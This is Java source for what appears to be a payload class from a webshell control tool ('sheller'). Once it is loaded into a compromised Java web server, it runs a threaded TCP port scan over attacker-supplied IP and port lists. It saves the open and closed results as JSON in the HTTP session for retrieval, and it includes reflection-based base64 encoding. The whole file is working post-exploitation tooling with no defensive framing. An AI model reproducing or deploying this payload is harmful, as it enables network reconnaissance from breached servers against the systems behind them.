package vip.youwe.sheller.payload.java;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class NewScan implements Runnable {

    public static String ipList;
    public static String portList;
    public static String taskID;
    private HttpSession Session;
    private ServletRequest Request;
    private ServletResponse response;

    public NewScan() {
    }

    public NewScan(HttpSession session) {
        this.Session = session;
    }


    public void execute(ServletRequest request, ServletResponse response, HttpSession session) throws Exception {
        (new Thread(new NewScan(session))).start();
    }


    public void run() {
        try {
            String[] ips = ipList.split(",");
            String[] ports = portList.split(",");
            Map<String, String> sessionObj = new HashMap<String, String>();
            Map<String, String> scanResult = new HashMap<String, String>();
            sessionObj.put("running", "true");
            for (String ip : ips) {

                for (String port : ports) {

                    try {
                        Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1000);
                        socket.close();
                        scanResult.put(ip + ":" + port, "open");
                    } catch (Exception ex) {
                        scanResult.put(ip + ":" + port, "closed");
                    }
                    sessionObj.put("result", buildJson(scanResult, false));
                    this.Session.setAttribute(taskID, sessionObj);
                }
            }
            sessionObj.put("running", "false");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                } else {
                    this.getClass();
                    Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }
}
